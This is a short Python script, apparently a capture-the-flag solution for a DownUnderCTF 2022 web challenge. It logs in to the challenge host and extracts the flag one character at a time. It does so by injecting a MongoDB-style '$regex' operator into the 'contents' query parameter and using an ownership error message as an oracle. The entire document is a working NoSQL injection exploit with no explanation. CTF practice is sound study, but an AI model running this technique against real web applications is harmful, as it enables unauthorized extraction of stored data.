import requests
import string 

url = "https://web-noteworthy-873b7c844f49.2022.ductf.dev/"
char = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!$}"
session = requests.Session()
r = session.post(url = url + "login" , json = {'username': 'j1s0o', 'password': '12345'})
flag = "DUCTF{n0s"

while True:
    for i in char:
        temp = flag + i 
        p = "noteId=1337&contents[$regex]"
        r = session.get(url = url + "edit" , params=f"{p}={temp}.")
        print(r.url)
        if "You are not the owner of this note!" in r.text:
            print(r.url)
            flag = temp
            print(flag)
            break